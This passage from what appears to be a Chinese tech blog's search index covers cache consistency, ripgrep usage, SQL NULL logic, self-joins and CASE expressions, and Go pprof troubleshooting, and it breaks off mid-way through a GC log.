这个case理论上会出现，不过，实际上出现的概率可能非常低，因为这个条件需要发生在读缓存时缓存失效，而且并发着有一个写操作。而实际上数据库的写操作会比读操作慢得多，而且还要锁表，而读操作必需在写操作前进入数据库操作，而又要晚于写操作更新缓存，所有的这些条件都具备的概率基本并不大。\n\n  所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!\n\n### 3.3 总结\n\n+ 缓存是删除，不是更新。\n+ 先更新数据库，再删除缓存。\n+ 缓存删除失败考虑重试机制，和缓存设置过期策略。\n\n# 4. 参考资料\n\n+ https://juejin.cn/post/6964531365643550751\n+ https://mp.weixin.qq.com/s/-0_ReIv2bp5snq3NUI3P7A\n+ https://coolshell.cn/articles/17416.html\n","tags":["sql"],"categories":["数据库"]},{"title":"文本搜索神器rg的使用教程","url":"%2Fp%2F868944ef.html","content":"\n说到文本搜索工具，大家一定会知道 grep, 它是 linux 最有用并最常用的工具之一。但如果在一个大的工程项目中搜索某个关键词，它会有些耗时。\n\n如果有更好的替代工具, 最出名的应该是 Ack，Ag ,  而现在一个新的替代者 Ripgrep,  简称`rg`,  比它们更快, 更省电.\n\n<!-- more -->\n\n# 1. 介绍\n\nRipGrep 与 The Silver Searcher(ag)、Ack 和 GNU Grep 的功能类似。\n\nRipGrep 是一个以行为单位的搜索工具， 它根据提供的 pattern 递归地在指定的目录里搜索。它是由 Rust 语言写成，相较与同类工具，它的特点就是无与伦比地快。\n\n+ 自动递归搜索 （grep 需要-R）\n+ 自动忽略.gitignore 中的文件以及二进制文件\n+ 可以搜索指定文件类型（rg -t py foo限定 python 文件， rg -T js foo排除 js 文件)\n+ 支持大部分 grep 的 feature(常用的都有)\n+ 支持各种文件编码（UTF-8， UTF-16， latin-1, GBK, EUC-JP, Shift_JIS 等等）\n+ 支持搜索常见压缩文件(gzip, xz, lzma, bzip2, lz4)\n+ 自动高亮匹配的结果\n\n### 1.1 扩展阅读\n\n强中更有强中手, 现在还有rga: ripgrep, 并且还能搜索 PDFs, E-Books, Office documents, zip, tar.gz, 等等.\n\n参考: https://github.com/phiresky/ripgrep-all\n\n\n\n# 2. 使用\n\n### 2.1 安装\n\n```bash\nbrew install ripgrep\nalias grep=\"rg\"  # 强制转向 rg\n```\n\n\n\n### 2.2 基础搜索\n\ncat a.txt, 我们以下面的文件为测试文件, 可以发现rg 和 grep 的选项大部分一样\n\n```txt\ntest\na\nb\nc\nd\ne\nf\ng\ntest1\nTEST2\n```\n\n1. 我们先来一个最基础的搜索:\n\n```bash\nrg 'test'  a.txt\n1:test\n9:test1\n```\n\n\n\n2. `-w`有word之意，表示搜索的字符串作为一个独立的单词时才会被匹配到。\n\n```bash\nrg -w 'test'  a.txt\n1:test\n```\n\n\n\n3. 使用`-i`选项，即可在搜索时不区分大小写\n\n```bash\nrg -i 'test'  a.txt\n1:test\n9:test1\n10:TEST2\n```\n\n\n\n4. `-l`只打印有匹配的文件名\n\n```bash\nrg -l 'test'  a.txt\na.txt\n```\n\n\n\n5. `-C` 输出匹配上下几行的内容\n\n```bash\nrg -C 2 'c'  a.txt\n\n2-a\n3-b\n4:c\n5-d\n6-e\n```\n\n\n\n### 2.3 高级搜索\n\n1. 使用 `-e REGEX` 来指定正则表达式\n\n```bash\nrg -e \"*sql\" -C2\n```\n\n\n\n2.  默认 rg 会忽略 `.gitignore` 和隐藏文件，可以使用 `-uu` 来查询所有内容\n\n```bash\nrg -uu \"word\" .\n```\n\n\n\n3. 可以使用 `-t type` 来指定文件类型：\n\n```bash\nrg -t markdown \"mysql\" .  # 在 md 文件中查找 “mysql” 关键字\n```\n\n支持的文件类型可以通过 `rg --type-list` 查看\n\n\n\n### 2.4 搜索文件\n\n 列出当前文件夹会进行查询的所有文件, 该选项其实可相当于：find . -type f，查找当前目录所有文件\n\n```bash\nrg --files . \nalias rgf='rg --files | rg' # 可来个别名\n```\n\n 搜索以 md 为后缀的文件\n\n```bash\nrg --files . | rg -e \".md$\" # 正则匹配\n```\n\n\n\n# 3. vim里使用\n\n### 3.1 配合 fzf\n\n```bash\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"极限搜索文件\nPlug 'junegunn/fzf.vim'\nnnoremap <leader>fo :Files<CR>\"映射\nnnoremap <leader>fif :Rg<CR> \"映射\n```\n\n`:Rg`\n\n![image-20210319000653060](文本搜索神器rg的使用教程/1.png)\n\n\n\n# 4. 参考资料\n\n+ https://github.com/BurntSushi/ripgrep\n+ https://einverne.github.io/post/2019/09/ripgrep-recursively-searches-directories-using-regex-pattern.html\n+ https://juejin.cn/post/6844903680446038029\n+ https://github.com/phiresky/ripgrep-all","tags":["grep"],"categories":["软件"]},{"title":"sql进阶教程03-三值逻辑和NULL","url":"%2Fp%2Fca905f18.html","content":"\n大多数编程语言都是基于二值逻辑的，即逻辑真值只有真和假两个。而 SQL 语言则采用一种特别的 逻辑体系——三值逻辑，即逻辑真值除了真和假，还有第三个值“不确定”。三值逻辑经常会带来一些意想不到的情况，这让程序员很是烦恼。\n\n<!-- more -->\n\n### 1.1 三值逻辑还是四值逻辑\n\n SQL 里只存在 一种 NULL。然而在讨论 NULL 时，我们一般都会将它分成两种类型来思考。 因此这里先来介绍一些基础知识，即两种 NULL 之间的区别。\n\n**两种 NULL 分别指的是“未知”(unknown)和“不适用”(not applicable, inapplicable)。**\n\n+ 以“不知道戴墨镜的人眼睛是什么颜色”这种情 况为例，这个人的眼睛肯定是有颜色的，但是如果他不摘掉眼镜，别人就 不知道他的眼睛是什么颜色。这就叫作未知。\n\n+ 而“不知道冰箱的眼睛是什 么颜色”则属于“不适用”。因为冰箱根本就没有眼睛，所以“眼睛的颜色” 这一属性并不适用于冰箱。\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B03-%E4%B8%89%E5%80%BC%E9%80%BB%E8%BE%91%E5%92%8CNULL/image-20220318162307153.png\" alt=\"image-20220318162307153\" style=\"zoom:50%;\" />\n\nCodd 曾经认为应该严格地区分两种类型的 NULL，并提倡在关系数据 库中使用四值逻辑 。现在所有的 DBMS 都将两种类型的 NULL 归为了一类并采用了三值逻辑。\n\n\n\n### 1.2 IS NULL\n\n为什么必须写成“IS NULL”，而不是“= NULL”\n\n```sql\n--以下的式子都会被判为 unknown \n\n1 = NULL\n2 > NULL\n3 < NULL\n4 <> NULL NULL = NULL\n```\n\n那么，为什么对 NULL 使用比较谓词后得到的结果永远不可能为真呢? 这是因为，NULL 既不是值也不是变量。NULL 只是一个表示“没有值”的 标记，而比较谓词只适用于值。因此，对并非值的 NULL 使用比较谓词本来就是没有意义的。\n\n\n\nNULL 容易被认为是值的原因恐怕有两个。第一个是在 C 语言等编程 语言里面，NULL 被定义为了一个常量(很多语言将其定义为了整数 0)， 这导致了人们的混淆。但是，其实 SQL 里的 NULL 和其他编程语言里的 NULL 是完全不同的东西。\n\n\n\n第二个原因是，IS NULL 这样的谓词是由两个单词构成的，所以人们 容易把 IS 当作谓词，而把 NULL 当作值。我们应该把 IS NULL 看作是一个谓词。因此，如果可以的话，写成 IS_NULL 这样也许更合适。\n\n\n\n### 1.3 真值unknown\n\n真值 **unknown** 和作为 NULL 的一种的 UNKNOWN(未知)是不同的东西。（前者是明确的布尔型的真值，后者既不是值也不 是变量）。\n\nx 是真值 **unknown** 时，x=x 被判断为 **true**，而 x 是 UNKNOWN 时被判断为 **unknown**。\n\n```sql\n-- 这个是明确的真值的比较 \nunknown = unknown \t\t\t\t→ true\n\n\n-- 这个相当于NULL = NULL \nUNKNOWN = UNKNOWN \t\t\t\t→ unknown\n```\n\n\n\n+ SQL 遵循的三值逻辑的真值表\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B03-%E4%B8%89%E5%80%BC%E9%80%BB%E8%BE%91%E5%92%8CNULL/image-20220318163228105.png\" alt=\"image-20220318163228105\" style=\"zoom: 50%;\" />\n\n图中浅蓝色部分是三值逻辑中独有的运算，这在二值逻辑中是没有的。 其余的 SQL 谓词全部都能由这三个逻辑运算组合而来。从这个意义上讲， 这个矩阵可以说是 SQL 的母体(matrix)。\n\n为了便于记忆，请注 意这三个真值之间有下面这样的优先级顺序。\n\n+ **AND** 的情况: **false** > **unknown** > **true** \n+ **OR** 的情况: **true** > **unknown** > **false**\n\n\n\n优先级高的真值会决定计算结果。例如**true** AND **unknown**，因为 **unknown**的优先级更高，所以结果是**unknown**。而**true** OR **unknown**的话，因为 **true** 优先级更高，所以结果是 **true**。\n\n\n\n### 1.4 比较谓词和 NULL\n\n+ 约翰是 20 岁，或者不是 20 岁，二者必居其一。\n\n“把命题和它的否命题通 过‘或者’连接而成的命题全都是真命题”这个命题在二值逻辑中被称为 排中律(Law of Excluded Middle)。\n\n```sql\n-- 查询年龄是 20 岁或者不是 20 岁的学生 \n\nSELECT * FROM Students WHERE age = 20 OR age <> 20;\n```\n\n遗憾的是，在 SQL 的世界里，排中律是不成立的。如果有一条存在NULL。\n\n```sql\n-- 添加第 3 个条件 :年龄是 20 岁，或者不是 20 岁，或者年龄未知 \n\nSELECT * FROM Students WHERE age = 20 OR age <> 20 OR age IS NULL;\n```\n\n\n\n+ CASE WHEN时也要注意\n\n```sql\n-- col_1 为 1 时返回○、为 NULL 时返回 × 的 CASE 表达式? \n\nCASE col_1 WHEN 1 THEN '○'\nWHEN NULL THEN '×' END\n\n-- 修改成下面的\n\nCASE WHEN col_1 = 1 THEN '○' \nWHEN col_1 IS NULL THEN '×' END\n```\n\n\n\n+ NOT IN 和 NOT EXISTS\n\n```sql\n-- 这条 SQL 语句真的能正确地查询到NULL age 的学生吗?遗憾的是不能。 结果是空，查询不到任何数据。\n\nSELECT * FROM Class_A\nWHERE age NOT IN ( SELECT age\nFROM Class_B\nWHERE city = '东京' );\n\n\n\n-- 正确的 SQL 语句: NULL age将被查询到\nSELECT *\nFROM Class_A A\nWHERE NOT EXISTS ( SELECT * FROM Class_B B WHERE A.age = B.age AND B.city = '东京' );\n```\n\n产生这样的结果，是因为 EXISTS 谓词永 远不会返回 **unknown**。EXISTS 只会返回 **true** 或者 **false**。因此就有了 IN 和 EXISTS 可以互相替换使用，而 NOT IN 和 NOT EXISTS 却不可以互 相替换的混乱现象。虽然写代码的时候很难做到绝对不依赖直觉，但作为 数据库工程师来说，还是需要好好理解一下这种现象。\n\n\n\n### 1.5 限定谓词和极值函数对待NULL非等价\n\n+ 限定谓词\n\n```sql\n -- 查询比 B 班住在东京的所有学生年龄都小的 A 班学生\nSELECT *\nFROM Class_A\nWHERE age < ALL ( SELECT age FROM Class_B\nWHERE city = '东京' );\n```\n\n\n\n+ 极值函数\n\n```sql\n-- 查询比 B 班住在东京的年龄最小的学生还要小的 A 班学生 \nSELECT *\nFROM Class_A\nWHERE age < ( SELECT MIN(age) FROM Class_B\nWHERE city = '东京' );\n```\n\n\n\n+ 总结\n\n极值函数在统计时会把为 NULL 的数据排除掉。\n\n1. ALL谓词:他的年龄比在东京住的所有学生都小 \n2. 极值函数:他的年龄比在东京住的年龄最小的学生还要小\n\n在现实世界中，这两个命题是一个意思。但是，正如我们通过前面的 例题看到的那样，表里存在 NULL 时它们是不等价的。\n\n\n\n### 1.6 聚合函数和 NULL\n\nCOUNT 以外 的聚合函数也是如此。\n\n```sql\n-- 查询比住在东京的学生的平均年龄还要小的 A 班学生的 SQL 语句? \nSELECT * FROM Class_A\nWHERE age < ( SELECT AVG(age)\nFROM Class_B\nWHERE city = '东京' )\n```\n\n没有住在东京的学生时，AVG 函数返回 NULL。因此，外侧的 WHERE 子句永远是 **unknown**，也就查询不到行。\n\n**聚合函数和极值函数的这个陷阱是由函数自身带来的**，所以仅靠为具体列加上 NOT NULL 约束是无法从根本上消除的。因此我们在编写 SQL 代码的时候需要特别注意。\n\n\n\n### 1.7 总结\n\n+ NULL 不是值。\n+ 因为 NULL 不是值，所以不能对其使用谓词。\n+ 对 NULL 使用谓词后的结果是 **unknown**。\n+ **unknown** 参与到逻辑运算时，SQL 的运行会和预想的不一样。\n\n+ 要想解决 NULL 带来的各种问题，最佳方法应该是往 表里添加NOT NULL约束来尽力排除NULL。这样就可以回到美妙的二值逻 辑世界(虽然并不能完全回到)。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["sql"],"categories":["数据库"]},{"title":"sql进阶教程02-自连接","url":"%2Fp%2F93c1444.html","content":"\n无论表还是视图，本质上都是集合。集合是 SQL 能处理的唯一的数据结构。\n\n<!-- more -->\n\n### 1.1 自连接使用\n\n自连接和非等值连接结合起来非常好用。\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314165606924.png\" alt=\"image-20220314165606924\" style=\"zoom: 50%;\" />\n\n```sql\n-- 用于获取排列的 SQL 语句\nSELECT P1.name AS name_1, P2.name AS name_2\nFROM Products P1, Products P2 WHERE P1.name <> P2.name;\n```\n\n无论是 P1 还是 P2，实际上数据都来自同一张物理表 Product。但是，在 SQL 里，只要被赋予了不同的名称，即便是相同的表也 应该当作不同的表(集合)来对待。也就是说，P1 和 P2 可以看成是碰巧 存储了相同数据的两个集合。\n\n\n\n### 1.2 查找局部不一致的列\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314162817302.png\" alt=\"image-20220314162817302\" style=\"zoom: 50%;\" />\n\n```sql\nSELECT DISTINCT P1.name,P1.price FROM Products P1, Products P2 WHERE P1.name <> P2.name AND P1.price = P2.price;\n\n/*\n草莓\t100\n葡萄\t50\n香蕉\t50\n橘子\t100\n苹果\t50\n*/\n```\n\n\n\n### 1.3 排序\n\n排序从 1 开始。如果已出现相同位次，则跳过之后的位次。\n\n```sql\nSELECT name, price, (SELECT COUNT(P2.price) FROM Products P2 WHERE P2.price > P1.price) +1 AS rank\nFROM Products P1 order by rank\n\n/*\n草莓\t100\t1\n橘子\t100\t1\n西瓜\t80\t3\n葡萄\t50\t4\n苹果\t50\t4\n香蕉\t50\t4\n柠檬\t30\t7\n*/\n```\n\n这道例题很好 地体现了面向集合的思维方式。子查询所做的，是计算出价格比自己高的 记录的条数并将其作为自己的位次。\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314171123022.png\" alt=\"image-20220314171123022\" style=\"zoom: 50%;\" />\n\n### 1.4 集合包含关系\n\n```sql\n/*\n柠檬\t30\n葡萄\t50\n西瓜\t80\n橘子\t100\n*/\n\n\n\n\nSELECT P1.name,\n       MAX(P1.price) AS price,\n       COUNT(P2.name) +1 AS rank_1\n  FROM Products P1 LEFT JOIN Products P2\n    ON P1.price < P2.price\n GROUP BY P1.name\n ORDER BY rank_1;\n\n/*\n橘子\t100\t1\n西瓜\t80\t2\n葡萄\t50\t3\n柠檬\t30\t4\n */\n```\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314172551051.png\" alt=\"image-20220314172551051\" style=\"zoom: 33%;\" />\n\n\n\n<img src=\"sql%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B02-%E8%87%AA%E8%BF%9E%E6%8E%A5/image-20220314172928558.png\" alt=\"image-20220314172928558\" style=\"zoom: 33%;\" />\n\n### 1.5 总结\n\n与多表之间进行的普通连接相比，自连接的性能开销更大(特别是与非等值连接结合使用的时候)，因此用于自连接的列推荐使用主键 或者在相关列上建立索引。\n\n+ 自连接经常和非等值连接结合起来使用。 \n+ 自连接和GROUP BY结合使用可以生成递归集合。\n+ 将自连接看作不同表之间的连接更容易理解。\n+ 应把表看作行的集合，用面向集合的方法来思考。\n+  自连接的性能开销更大，应尽量给用于连接的列建立索引。","tags":["sql"],"categories":["数据库"]},{"title":"sql进阶教程01-case表达式","url":"%2Fp%2F4229a5b2.html","content":"\n新手用 **WHERE** 子句和 **HAVING** 子句进行条件分支，高手用 **SELECT** 子句进行条件 分支。\n\n<!-- more -->\n\n### 1.1 基础使用\n\nCASE 表达式是不依赖于具体 数据库的技术，所以可以提高 SQL 代码的可移植性。\n\n```sql\nCREATE TABLE `users` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `sex` tinyint(4) NOT NULL DEFAULT '1' COMMENT '1 男 2女',\n  `name` varchar(255) NOT NULL DEFAULT '0',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4;\n\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (1, 2, 'levon');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (2, 1, 'fly');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (3, 1, 'xuan');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (4, 1, 'yuan');\nINSERT INTO `sql_advance`.`users` (`id`, `sex`, `name`) VALUES (5, 2, 'haha');\n\nSELECT name,(CASE WHEN sex = 1 THEN '男' WHEN sex = 2 THEN '女' ELSE '其他' END)sex FROM users\n/*\nlevon\t女\nfly\t男\nxuan\t男\nyuan\t男\nhaha\t女\n*/\n```\n\n如果 CASE 表达式里没有明确指定 ELSE 子句， 执行结果会被默认地处理成ELSE NULL。所以一定要写ELSE。\n\n\n\n### 1.2 select 不同条件\n\n<img src=\"sql进阶教程01-case表达式/1.png\" alt=\"image-20220311181835776\" style=\"zoom:33%;\" />\n\n\n\n```sql\n/* 用一条SQL语句进行不同条件的统计 */\nSELECT pref_name,\n       /* 男性人口 */\n       SUM( CASE WHEN sex = '1' THEN population ELSE 0 END) AS cnt_m,\n       /* 女性人口 */\n       SUM( CASE WHEN sex = '2' THEN population ELSE 0 END) AS cnt_f\n  FROM PopTbl2\n GROUP BY pref_name;\n \n \n /*\n东京\t250\t150\n佐贺\t20\t80\n德岛\t60\t40\n爱媛\t100\t50\n福冈\t100\t200\n长崎\t125\t125\n香川\t100\t100\n高知\t100\t100\n */\n```\n\n\n\n这个技巧可贵的地方在于，它能将 SQL 的查询结果转换为二维表的格式。\n\n如果只是简单地用 GROUP BY 进行聚合，那么查询后必须通过程序将结果的格式转换一下，才能使之成为交叉表。\n\n\n\n### 1.3 update 调换值\n\n```sql\n/* 用CASE表达式调换主键值 */\nUPDATE SomeTable\n   SET p_key = CASE WHEN p_key = 'a'\n                    THEN 'b'\n                    WHEN p_key = 'b'\n                    THEN 'a'\n                    ELSE p_key END\n WHERE p_key IN ('a', 'b');\n```\n\n\n\n### 1.4 强大表达能力\n\n在 CASE 表达式里，我们可以使用 BETWEEN、LIKE 和 <、 > 等 便利的谓词组合，以及能嵌套子查询的 IN 和 EXISTS 谓词。因此，CASE 表达式具有非常强大的表达能力。\n\n\n\n作为表达式，CASE 表达式在执行时会被判定为一个固定值，因此它 可以写在聚合函数内部;也正因为它是表达式，所以还可以写在 SELECE 子句、GROUP BY 子句、WHERE 子句、ORDER BY 子句里。简单点说，在能 写列名和常量的地方，通常都可以写 CASE 表达式。\n\n\n\n### 1.5 练习\n\n+ 从多列数据里选出最大值该怎么做呢\n\n<img src=\"sql进阶教程01-case表达式/2.png\" alt=\"image-20220314120315683\" style=\"zoom:50%;\" />\n\n  ```sql\n SELECT `key`, CASE WHEN x > y THEN x ELSE (CASE WHEN y > z THEN y ELSE z END) END greatest FROM Greatests\n\n  /*\n  A\t3\n  B\t5\n  C\t7\n  D\t8\n  */\n  ```\n\n\n\n\n+ 用 ORDER BY 生成“排序”列, 使得结果按照 B-A-D-C 这样的指定顺 序进行排列。\n\n  ```sql\n  SELECT `key` FROM Greatests ORDER BY CASE `key`\n              WHEN 'B' THEN 1\n              WHEN 'A' THEN 2\n              WHEN 'D' THEN 3\n              WHEN 'C' THEN 4\n              ELSE NULL END;\n  ```\n\n  \n\n+ 转换行列 (1.2)\n\n  ```sql\n   SELECT CASE WHEN sex = 1 THEN '男' ELSE '女' END 性别,\n         SUM(population) AS total,\n         SUM(CASE WHEN pref_name = '德岛' THEN population ELSE 0 END) AS 德岛,\n         SUM(CASE WHEN pref_name = '香川' THEN population ELSE 0 END) AS 香川,\n         SUM(CASE WHEN pref_name = '爱媛' THEN population ELSE 0 END) AS 爱媛,\n         SUM(CASE WHEN pref_name = '高知' THEN population ELSE 0 END) AS 高知,\n         SUM(CASE WHEN pref_name IN ('德岛', '香川', '爱媛', '高知') THEN population ELSE 0 END) AS 四国\n    FROM PopTbl2\n   GROUP BY sex;\n   \n   /*\n  男\t855\t60\t100\t100\t100\t360\n  女\t845\t40\t100\t50\t100\t290\n   */\n  ```\n\n  \n\n### 1.6  总结\n\n\n1. 在 GROUP BY 子句里使用 CASE 表达式，可以灵活地选择作为聚合 的单位的编号或等级。这一点在进行非定制化统计时能发挥巨大的威力。 2. 在聚合函数中使用 CASE 表达式，可以轻松地将行结构的数据转换\n成列结构的数据。\n3. 相反，聚合函数也可以嵌套进 CASE 表达式里使用。\n4. 相比依赖于具体数据库的函数，CASE 表达式有更强大的表达能力\n和更好的可移植性。\n5. 正因为 CASE 表达式是一种表达式而不是语句，才有了这诸多优点。","tags":["sql"],"categories":["数据库"]},{"title":"pprof排查golang问题","url":"%2Fp%2F771638a0.html","content":"\n# 1. quick start\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t_ \"net/http/pprof\"\n)\n\nfunc main() {\n\tlog.Println(http.ListenAndServe(\"localhost:6060\", nil))\n}\n\n```\n\n<!-- more -->\n\n打开浏览器, 输入 `http://localhost:6060/debug/pprof/`, 内容显示如下:\n\n```bash\n/debug/pprof/\n\nTypes of profiles available:\nCount\tProfile\n1\tallocs # 内存分配情况的采样信息\n0\tblock\t # 阻塞操作情况的采样信息\n0\tcmdline #\t显示程序启动命令及参数\n4\tgoroutine # 当前所有协程的堆栈信息\n1\theap # 堆上内存使用情况的采样信息\n0\tmutex # 锁争用情况的采样信息\n0\tprofile # CPU 占用情况的采样信息\n5\tthreadcreate # 系统线程创建情况的采样信息\n0\ttrace # 程序运行跟踪信息\nfull goroutine stack dump\n```\n\n上面每一个都是一个超链接, 可以点进去, 看到堆栈信息\n\n\n\n# 2. 命令查看\n\n+ mac需要安装graphviz\n\n    ```bash\n    brew install graphviz\n    # 如果一直下载不成功, 修改brew源\n    ```\n    \n+ 查看内存使用情况\n\n  ```bash\n  go tool pprof http://localhost:6060/debug/pprof/heap\n  # 进入如下gdb交互模式:\n  \n  # top 查看前10个的内存分配情况\n  (pprof) top\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n        flat  flat%   sum%        cum   cum%\n      1.16MB   100%   100%     1.16MB   100%  runtime/pprof.writeGoroutineStacks\n           0     0%   100%     1.16MB   100%  net/http.(*ServeMux).ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.(*conn).serve\n           0     0%   100%     1.16MB   100%  net/http.HandlerFunc.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.serverHandler.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http/pprof.Index\n           0     0%   100%     1.16MB   100%  net/http/pprof.handler.ServeHTTP\n           0     0%   100%     1.16MB   100%  runtime/pprof.(*Profile).WriteTo\n           0     0%   100%     1.16MB   100%  runtime/pprof.writeGoroutine\n           \n           \n  # tree 以树状显示\n  (pprof) tree\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n  ----------------------------------------------------------+-------------\n        flat  flat%   sum%        cum   cum%   calls calls% + context\n  ----------------------------------------------------------+-------------\n                                              1.16MB   100% |   runtime/pprof.writeGoroutine\n      1.16MB   100%   100%     1.16MB   100%                | runtime/pprof.writeGoroutineStacks\n      \n      \n  # png 以图片格式输出,在当前目录下\n  (pprof) png\n  Generating report in profile001.png\n  \n  # svg 生成浏览器可以识别的svg文件,在当前目录下, 直接点开在浏览器查看\n  (pprof) png\n  Generating report in profile001.png\n  ```\n  \n  \n  \n  | 列名  | 含义                                                         |\n  | ----- | ------------------------------------------------------------ |\n  | flat  | 本函数的执行耗时                                             |\n  | flat% | flat 占 CPU 总时间的比例。程序总耗时 16.22s, Eat 的 16.19s 占了 99.82% |\n  | sum%  | 前面每一行的 flat 占比总和                                   |\n  | cum   | 累计量。指该函数加上该函数调用的函数总耗时                   |\n  | cum%  | cum 占 CPU 总时间的比例                                      |\n  \n  \n\n\n# 3. 实践\n\n```bash\n# 下载测试项目\ngit clone https://github.com/wolfogre/go-pprof-practice\n\n# 执行\ngo build\n./go-pprof-practice\n```\n\n\n\n### 3.1 排查CPU\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/profile\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 15270ms, 99.09% of 15410ms total\nDropped 40 nodes (cum <= 77.05ms)\nShowing top 10 nodes out of 11\n      flat  flat%   sum%        cum   cum%\n   12310ms 79.88% 79.88%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat\n    1170ms  7.59% 87.48%     1170ms  7.59%  runtime.memmove\n     800ms  5.19% 92.67%      800ms  5.19%  runtime.memclrNoHeapPointers\n     520ms  3.37% 96.04%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n     470ms  3.05% 99.09%      470ms  3.05%  runtime.asyncPreempt\n         0     0% 99.09%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Live\n         0     0% 99.09%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0% 99.09%    15310ms 99.35%  main.main\n         0     0% 99.09%     1980ms 12.85%  runtime.growslice\n         0     0% 99.09%    15310ms 99.35%  runtime.main\n         \n         \n很明显，CPU 占用过高是 github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat 造成的。   \n\n# 输入 list Eat，查看问题具体在代码的哪一个位置：\n\n(pprof) list Eat\nTotal: 15.41s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/felidae/tiger/tiger.go\n    12.31s     12.78s (flat, cum) 82.93% of Total\n         .          .     19:}\n         .          .     20:\n         .          .     21:func (t *Tiger) Eat() {\n         .          .     22:   log.Println(t.Name(), \"eat\")\n         .          .     23:   loop := 10000000000\n    12.31s     12.78s     24:   for i := 0; i < loop; i++ {\n         .          .     25:           // do nothing\n         .          .     26:   }\n         .          .     27:}\n         .          .     28:\n         .          .     29:func (t *Tiger) Drink() {\n         \n\n可以看到，是第 24 行那个一百亿次空循环占用了大量 CPU 时间，至此，问题定位成功！\n\n\n# 输入 web, 会在浏览器弹出一个图\n图中，tiger.(*Tiger).Eat 函数的框特别大，箭头特别粗，pprof 生怕你不知道这个函数的 CPU 占用很高。\n```\n\n![1](pprof排查golang问题/1.png)\n\n\n\n### 3.2 排查内存\n\n```bash\n# 把死循环代码注释, 接着测试, 看内存使用, 注意是 heap\ngo tool pprof http://localhost:6060/debug/pprof/heap\n\n# 看 top\n(pprof) top\nShowing nodes accounting for 768MB, 100% of 768MB total\n      flat  flat%   sum%        cum   cum%\n     768MB   100%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n         0     0%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0%   100%      768MB   100%  main.main\n         0     0%   100%      768MB   100%  runtime.main\n\n# 查看占用最多的这个函数\n(pprof) list Steal\nTotal: 768MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/muridae/mouse/mouse.go\n     768MB      768MB (flat, cum)   100% of Total\n         .          .     45:\n         .          .     46:func (m *Mouse) Steal() {\n         .          .     47:   log.Println(m.Name(), \"steal\")\n         .          .     48:   max := constant.Gi\n         .          .     49:   for len(m.buffer) * constant.Mi < max {\n     768MB      768MB     50:           m.buffer = append(m.buffer, [constant.Mi]byte{})\n         .          .     51:   }\n         .          .     52:}\n         \n可以看到，这里有个循环会一直向 m.buffer 里追加长度为 1 MiB 的数组，直到总容量到达 1 GiB 为止，且一直不释放这些内存，这就难怪会有这么高的内存占用了。\n\n# 输入 web, 再次在浏览器感受一下, 也可以输入 png\n```\n\n![1](pprof排查golang问题/2.png)\n\n\n\n### 3.3 排查 GC\n\n```bash\n# 频繁的 GC 对 golang 程序性能的影响也是非常严重的。虽然现在这个程序内存使用量并不高，但这会不会是频繁 GC 之后的假象呢？\n\n# 为了获取程序运行过程中 GC 日志，我们需要先退出炸弹程序，再在重新启动前赋予一个环境变量，同时为了避免其他日志的干扰，使用 grep 筛选出 GC 日志查看：\nGODEBUG=gctrace=1 ./go-pprof-practice | grep gc\n\ngc 1 @0.003s 2%: 0.004+0.44+0.004 ms clock, 0.004+0.21/0.11/0+0.004 ms cpu, 16->16->0 MB, 17 MB goal, 1 P\ngc 2 @6.201s 0%: 0.041+2.9+0.004 ms clock, 0.041+0.31/0/0+0.004 ms cpu, 7->7->6 MB, 8 MB goal, 1 P\ngc 3 @6.204s 0%: 0.026+6.2+0.003 ms clock, 0.026+0.23/0/0+0.003 ms cpu, 14->14->12 MB, 15 MB goal, 1 P\ngc 4 @6.211s 0%: 0.038+10+0.003 ms clock, 